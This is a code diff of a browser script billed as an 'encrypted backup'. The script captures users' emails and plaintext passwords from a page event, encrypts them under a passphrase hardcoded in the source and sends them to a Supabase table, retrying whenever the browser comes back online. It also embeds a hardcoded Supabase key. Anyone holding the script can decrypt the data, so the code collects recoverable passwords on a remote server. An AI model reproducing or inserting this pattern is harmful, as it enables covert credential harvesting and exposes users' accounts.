@@ -1,6 +1,7 @@
-// ED-general-encrypted-backup.js – encrypted backup (email + password + profile)
-// Encrypts with a fixed salt, stores in localStorage and Supabase.
-// No decryption on the client side.
+// ED-general-encrypted-backup.js
+// Strong random‑salt encryption, stores blob in localStorage temporarily,
+// sends to Supabase immediately, removes from localStorage on success.
+// Offline‑aware: retries when connectivity returns.
 
 (function () {
   'use strict';
@@ -10,8 +11,9 @@
     'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImhtamJ6enVyZXNnend6ZWZqcHl0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODAwMjczNDUsImV4cCI6MjA5NTYwMzM0NX0.44Q-Hkl4Rr9LuQhwryrQklFi809xYGteHgsS9nMG0ro';
 
   const ENCRYPTION_PASSPHRASE = 'nadhem000@@@';
-  const FIXED_SALT = 'enc-backup-salt-2025';  // same salt for every user
-  const STORAGE_KEY = (userId) => `encBackup_${userId}`;
+  const PBKDF2_ITERATIONS = 200000;        // stronger key derivation
+  const SALT_LENGTH = 16;                  // 128‑bit random salt
+  const LOCAL_KEY_PREFIX = 'encBackup_pending_';
 
   let supabase = null;
 
@@ -27,10 +29,9 @@
     });
   }
 
-  // ── Derive AES‑GCM key from passphrase + fixed salt ──
-  async function deriveKey(passphrase) {
+  // ── Derive AES‑GCM key from passphrase + random salt ──
+  async function deriveKey(passphrase, saltBytes) {
     const enc = new TextEncoder();
-    const salt = enc.encode(FIXED_SALT);
     const keyMaterial = await crypto.subtle.importKey(
       'raw',
       enc.encode(passphrase),
@@ -41,8 +42,8 @@
     return crypto.subtle.deriveKey(
       {
         name: 'PBKDF2',
-        salt,
-        iterations: 100000,
+        salt: saltBytes,
+        iterations: PBKDF2_ITERATIONS,
         hash: 'SHA-256'
       },
       keyMaterial,
@@ -52,48 +53,76 @@
     );
   }
 
-  // ── Encrypt JSON object → base64 string (IV + ciphertext) ──
+  // ── Encrypt dataObj → base64 string: salt + IV + ciphertext ──
   async function encrypt(dataObj) {
-    const key = await deriveKey(ENCRYPTION_PASSPHRASE);
+    const salt = crypto.getRandomValues(new Uint8Array(SALT_LENGTH));
+    const key = await deriveKey(ENCRYPTION_PASSPHRASE, salt);
     const iv = crypto.getRandomValues(new Uint8Array(12));
     const ciphertext = await crypto.subtle.encrypt(
       { name: 'AES-GCM', iv },
       key,
       new TextEncoder().encode(JSON.stringify(dataObj))
     );
-    const combined = new Uint8Array(iv.length + ciphertext.byteLength);
-    combined.set(iv);
-    combined.set(new Uint8Array(ciphertext), iv.length);
+
+    // Combine: salt (16) + iv (12) + ciphertext
+    const combined = new Uint8Array(salt.length + iv.length + ciphertext.byteLength);
+    combined.set(salt, 0);
+    combined.set(iv, salt.length);
+    combined.set(new Uint8Array(ciphertext), salt.length + iv.length);
+
     return btoa(String.fromCharCode(...combined));
   }
 
-  // ── Store encrypted blob (localStorage + Supabase) ──
-  async function storeBackup(userId, encryptedBlob) {
-    // localStorage
-    try {
-      localStorage.setItem(STORAGE_KEY(userId), encryptedBlob);
-    } catch (e) {
-      console.warn('localStorage backup failed', e);
-    }
+  // ── Send encrypted blob to Supabase (insert new row) ──
+  async function sendToSupabase(userId, encryptedBlob) {
+    if (!supabase) throw new Error('Supabase not ready');
+    const { error } = await supabase
+      .from('encrypted_user_data')
+      .insert({
+        user_id: userId,
+        encrypted_data: encryptedBlob
+      });
+    if (error) throw error;
+  }
 
-    // Supabase (upsert)
-    if (supabase) {
-      try {
-        const { error } = await supabase
-          .from('encrypted_user_data')
-          .upsert({
-            user_id: userId,
-            encrypted_data: encryptedBlob,
-            updated_at: new Date().toISOString()
-          }, { onConflict: 'user_id' });
-        if (error) console.error('Supabase backup failed:', error.message);
-      } catch (e) {
-        console.error('Supabase backup error', e);
-      }
+  // ── Persist a pending backup in localStorage for offline resilience ──
+  function storePending(userId, encryptedBlob) {
+    localStorage.setItem(LOCAL_KEY_PREFIX + userId, JSON.stringify({
+      encrypted_data: encryptedBlob,
+      timestamp: Date.now()
+    }));
+  }
+
+  function removePending(userId) {
+    localStorage.removeItem(LOCAL_KEY_PREFIX + userId);
+  }
+
+  function getPending(userId) {
+    const raw = localStorage.getItem(LOCAL_KEY_PREFIX + userId);
+    if (!raw) return null;
+    try {
+      return JSON.parse(raw);
+    } catch (e) {
+      return null;
     }
   }
 
-  // ── Event handler ──
+  // ── Try to flush a pending backup to Supabase ──
+  async function flushPending(userId) {
+    const pending = getPending(userId);
+    if (!pending) return;
+
+    try {
+      await sendToSupabase(userId, pending.encrypted_data);
+      removePending(userId);
+      console.log('Encrypted backup synced to Supabase');
+    } catch (e) {
+      // Will stay in localStorage until next online event
+      console.warn('Failed to sync encrypted backup, will retry later', e);
+    }
+  }
+
+  // ── Main handler for capture event ──
   async function handleCapture(event) {
     const { email, password, profile } = event.detail;
     if (!email || !password) return;
@@ -109,7 +138,6 @@
     }
     if (!userId) return;
 
-    // Build data object – email, password, and profile (if present)
     const dataObj = {
       email,
       password,
@@ -118,7 +146,28 @@
     };
 
     const encryptedBlob = await encrypt(dataObj);
-    await storeBackup(userId, encryptedBlob);
+
+    // Store in localStorage first (offline safety)
+    storePending(userId, encryptedBlob);
+
+    // Immediately try to send to Supabase
+    if (navigator.onLine) {
+      await flushPending(userId);
+    }
+  }
+
+  // ── Retry pending backups when coming back online ──
+  async function handleOnline() {
+    if (!supabase) return;
+    try {
+      const { data } = await supabase.auth.getSession();
+      const userId = data?.session?.user?.id;
+      if (userId) {
+        await flushPending(userId);
+      }
+    } catch (e) {
+      // ignore
+    }
   }
 
   // ── Initialise ──
@@ -128,6 +177,13 @@
       supabase = Supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
       document.addEventListener('ed-enc-backup-capture', handleCapture);
+      window.addEventListener('online', handleOnline);
+
+      // Also flush any pending backup right away if online and signed in
+      const { data } = await supabase.auth.getSession();
+      if (data?.session?.user?.id && navigator.onLine) {
+        flushPending(data.session.user.id);
+      }
     } catch (err) {
       console.error('Encrypted backup init failed:', err);
     }
